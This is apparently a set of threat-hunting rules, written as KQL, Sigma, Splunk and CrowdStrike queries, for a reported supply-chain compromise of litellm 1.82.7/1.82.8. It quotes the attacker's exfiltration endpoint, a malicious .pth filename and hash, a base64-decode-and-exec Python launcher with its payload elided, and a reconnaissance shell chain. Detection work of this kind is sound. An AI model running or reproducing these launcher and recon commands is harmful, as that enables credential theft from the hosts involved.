Detects any host beaconing or POSTing encrypted credential bundles to the attacker-controlled exfil domain hardcoded in litellm 1.82.7/1.82.8. Both compromised versions encode stolen creds with AES-256-CBC + RSA-4096 and curl-POST to https://models.litellm.cloud/ — a single resolution from any host is high-confidence compromise. Rationale: Anchored on the exact exfil endpoint 'https://models.litellm.cloud/' named in the StepSecurity write-up. A single resolution of this domain (no legitimate caller exists — the real project is litellm.ai) is near-zero false-positive. Corroborated by Sonatype, Datadog Security Labs, Snyk, and Aqua/Unit42 TeamPCP write-ups. Cross-checked against: • https://www.sonatype.com/blog/compromised-litellm-pypi-package-delivers-multi-stage-credential-stealer • https://github.com/BerriAI/litellm/issues/24518 • https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-teampcp-supply-chain-campaign/ • https://snyk.io/blog/poisoned-security-scanner-backdooring-litellm/ • https://unit42.paloaltonetworks.com/teampcp-supply-chain-attacks/ • https://docs.litellm.ai/blog/security-update-march-2026

[LLM] Malicious litellm_init.pth dropped to site-packages by pip (litellm==1.82.8 install artifact) Installation High
Detects the install-time artifact unique to litellm 1.82.8 — a 34,628-byte .pth file named litellm_init.pth registered in the package's own RECORD. Because .pth files in site-packages execute on every Python interpreter startup (no import required), this filename appearing anywhere in site-packages is a direct compromise indicator. Rationale: Anchors on the verbatim filename 'litellm_init.pth' from the article's RECORD listing (litellm_init.pth,sha256=ceNa7wMJnNHy1kRnNCcwJaFjWX3pORLfMh7xGL8TUjg,34628). The filename is unique to this campaign — no upstream package uses it. Corroborated by Snyk and Datadog Security Labs vendor reports. Cross-checked against: • https://www.stepsecurity.io/blog/litellm-credential-stealer-hidden-in-pypi-wheel • https://snyk.io/blog/poisoned-security-scanner-backdooring-litellm/ • https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-teampcp-supply-chain-campaign/ • https://www.sonatype.com/blog/compromised-litellm-pypi-package-delivers-multi-stage-credential-stealer
ATT&CKT1195.002 T1546

| where Timestamp > ago(30d)
| where ActionType in ("FileCreated","FileModified","FileRenamed")
| where FileName =~ "litellm_init.pth"
   or (FolderPath has "site-packages" and FileName endswith ".pth" and SHA256 == "ceNa7wMJnNHy1kRnNCcwJaFjWX3pORLfMh7xGL8TUjg")
| project Timestamp, DeviceId, DeviceName, ActionType, FileName, FolderPath, FileSize, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessAccountName
| order by Timestamp desc
union isfuzzy=true
(ImFileEvent
  | where TimeGenerated > ago(30d)
  | where TargetFileName =~ "litellm_init.pth"
     or (TargetFilePath has "site-packages" and TargetFileName endswith ".pth")
  | project TimeGenerated, DvcHostname, ActorUsername, TargetFilePath, TargetFileName, TargetFileSize, ActingProcessName, ActingProcessCommandLine),
(Syslog
  | where TimeGenerated > ago(30d)
  | where Facility =~ "auth" or ProcessName has_any ("auditd","audisp")
  | where SyslogMessage has "litellm_init.pth"
  | project TimeGenerated, Computer, ProcessName, SyslogMessage)
| order by TimeGenerated desc

[LLM] Python spawning python -c with base64.b64decode exec (litellm .pth stage-1 launcher) Installation High
Detects the exact one-liner the malicious litellm_init.pth file uses to spawn the stage-1 credential harvester — a detached python subprocess that calls base64.b64decode followed by exec(). Pattern fires regardless of payload version because both 1.82.7 (proxy_server.py blob) and 1.82.8 (.pth) decode to the same base64-wrapped Python. Rationale: Anchors on the exact one-liner from the article: subprocess.Popen([sys.executable, "-c", "import base64; exec(base64.b64decode('...'))"]). The python→python parent/child with -c + base64.b64decode + exec( triple is unique to obfuscated loaders and is the canonical shape both compromised litellm builds emit. Confirmed across multiple vendor analyses (StepSecurity, Snyk, Datadog Security Labs). Cross-checked against: • https://www.stepsecurity.io/blog/litellm-credential-stealer-hidden-in-pypi-wheel • https://snyk.io/blog/poisoned-security-scanner-backdooring-litellm/ • https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-teampcp-supply-chain-campaign/
ATT&CKT1059.006 T1027 T1140
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName matches regex @"(?i)^python\d*(\.exe)?$"
| where FileName matches regex @"(?i)^python\d*(\.exe)?$"
| where ProcessCommandLine has "-c"
| where ProcessCommandLine has "base64.b64decode"
| where ProcessCommandLine has_any ("exec(","exec (")
| where AccountName !endswith "$"
| project Timestamp, DeviceId, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName, FileName, ProcessCommandLine, SHA256
| order by Timestamp desc
union isfuzzy=true
(SecurityEvent
  | where TimeGenerated > ago(30d)
  | where EventID == 4688
  | where ParentProcessName matches regex @"(?i)\\python\d*\.exe$"
  | where NewProcessName matches regex @"(?i)\\python\d*\.exe$"
  | where CommandLine has "-c" and CommandLine has "base64.b64decode" and CommandLine has "exec"
  | where AccountName !endswith "$"
  | project TimeGenerated, Computer, Account, AccountName, ParentProcessName, NewProcessName, CommandLine),
(ImProcessCreate
  | where TimeGenerated > ago(30d)
  | where ParentProcessName matches regex @"(?i)^python\d*(\.exe)?$"
  | where ActingProcessName matches regex @"(?i)^python\d*(\.exe)?$"
  | where ActingProcessCommandLine has "-c" and ActingProcessCommandLine has "base64.b64decode" and ActingProcessCommandLine has "exec"
  | project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ActingProcessName, ActingProcessCommandLine)
| order by TimeGenerated desc
title: litellm Stage-1 Launcher — Python Detached subprocess.Popen base64.b64decode exec
id: 1d8e5630-fc12-46aa-bb5e-7240a9b21f80
description: Detects the detached Python subprocess pattern emitted by the malicious litellm_init.pth (1.82.8) and the proxy_server.py base64 blob (1.82.7) — both decode to a Python -c invocation containing 'base64.b64decode' and 'exec('. Same payload, same parent-child shape on both compromised versions.
references:
  - https://www.stepsecurity.io/blog/litellm-credential-stealer-hidden-in-pypi-wheel
  - https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-teampcp-supply-chain-campaign/
author: SOC Detection Engineering
date: 2026/03/24
tags:
  - attack.execution
  - attack.t1059.006
  - attack.t1027
  - attack.t1140
logsource:
  category: process_creation
detection:
  selection_parent:
    ParentImage|re|i: '(\\|/)python\d*(\.exe)?$'
  selection_child:
    Image|re|i: '(\\|/)python\d*(\.exe)?$'
    CommandLine|contains|all:
      - '-c'
      - 'base64.b64decode'
      - 'exec('
  condition: all of selection_*
level: critical
source:(windows.sysmon OR linux.auditd) @ParentImage:(*\\python.exe OR *\\PYTHON.EXE OR */python OR */python3) @Image:(*\\python.exe OR *\\PYTHON.EXE OR */python OR */python3) @CommandLine:(*"-c"* AND *base64.b64decode* AND *exec\(*)
#event_simpleName=ProcessRollup2
| ParentBaseFileName=/^python\d*(\.exe)?$/i
| ImageFileName=/python\d*(\.exe)?$/i
| CommandLine=/-c/
| CommandLine=/base64\.b64decode/
| CommandLine=/exec\(/
| groupBy([aid, ComputerName, UserName, CommandLine, ParentBaseFileName, ImageFileName], function=count(as=Spawns))
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=t count min(_time) as firstTime max(_time) as lastTime values(Processes.process_hash) as hashes from datamodel=Endpoint.Processes where Processes.parent_process_name IN ("python.exe","python","python3","python3.10","python3.11","python3.12") Processes.process_name IN ("python.exe","python","python3","python3.10","python3.11","python3.12") (Processes.process="*base64.b64decode*" Processes.process="*exec(*" Processes.process="* -c *") by Processes.dest Processes.user Processes.parent_process Processes.process
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime values(Processes.process_hash) as hashes from datamodel=Endpoint.Processes where Processes.parent_process_name IN ("python.exe","python","python3","python3.10","python3.11","python3.12") Processes.process_name IN ("python.exe","python","python3","python3.10","python3.11","python3.12") (Processes.process="*base64.b64decode*" Processes.process="*exec(*" Processes.process="* -c *") by Processes.dest Processes.user Processes.parent_process Processes.process
| `drop_dm_object_name(Processes)`
| `security_content_ctime(firstTime)`
[LLM] Python process spawning shell with TeamPCP recon chain (hostname; whoami; uname; ip addr fallback) Actions on Objectives High
Detects the exact reconnaissance one-liner the litellm stage-1 harvester runs via subprocess.check_output(..., shell=True) before exfiltration. The chained 'hostname; pwd; whoami; uname -a; ip addr 2>/dev/null || ifconfig 2>/dev/null; ip route 2>/dev/null' string is verbatim from the article and rarely emitted by benign tooling. Rationale: The recon command string is byte-for-byte from the article ('hostname; pwd; whoami; uname -a; ip addr 2>/dev/null || ifconfig 2>/dev/null; ip route 2>/dev/null') and is run via shell=True so it shows up as a single child of python with all three discovery primitives in one cmdline. The combination is rare outside config-management tools (Ansible, Chef) which we exclude via parent process. Datadog Security Labs confirmed identical recon string. Cross-checked against: • https://www.stepsecurity.io/blog/litellm-credential-stealer-hidden-in-pypi-wheel • https://securitylabs.datadoghq.com/articles/litellm-compromised-pypi-teampcp-supply-chain-campaign/ • https://www.sonatype.com/blog/compromised-litellm-pypi-package-delivers-multi-stage-credential-stealer
ATT&CKT1082 T1033 T1016 T1059.004
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where InitiatingProcessFileName matches regex @"(?i)^python\d*(\.exe)?$"
| where FileName in~ ("sh","bash","dash","zsh","cmd.exe","powershell.exe","pwsh")
| where (ProcessCommandLine has "hostname" and ProcessCommandLine has "whoami" and ProcessCommandLine has "uname")
    or ProcessCommandLine has "ip addr 2>/dev/null || ifconfig"
    or (ProcessCommandLine has "hostname" and ProcessCommandLine has "printenv" and ProcessCommandLine has "ip route")
| project Timestamp, DeviceId, DeviceName, AccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, FileName, ProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
union isfuzzy=true
(ImProcessCreate
  | where TimeGenerated > ago(30d)
  | where ParentProcessName matches regex @"(?i)^python\d*(\.exe)?$"
  | where ActingProcessName in~ ("sh","bash","dash","zsh","cmd.exe","powershell.exe","pwsh")
  | where (ActingProcessCommandLine has "hostname" and ActingProcessCommandLine has "whoami" and ActingProcessCommandLine has "uname")
     or ActingProcessCommandLine has "ip addr 2>/dev/null || ifconfig"
  | project TimeGenerated, DvcHostname, ActorUsername, ParentProcessName, ActingProcessName, ActingProcessCommandLine),
(SecurityEvent
  | where TimeGenerated > ago(30d)
  | where EventID == 4688
  | where ParentProcessName matches regex @"(?i)\\python\d*\.exe$"
  | where NewProcessName endswith "cmd.exe" or NewProcessName endswith "powershell.exe" or NewProcessName endswith "pwsh.exe"
  | where (CommandLine has "hostname" and CommandLine has "whoami" and CommandLine has "uname")
  | project TimeGenerated, Computer, Account, ParentProcessName, NewProcessName, CommandLine)
| order by TimeGenerated desc
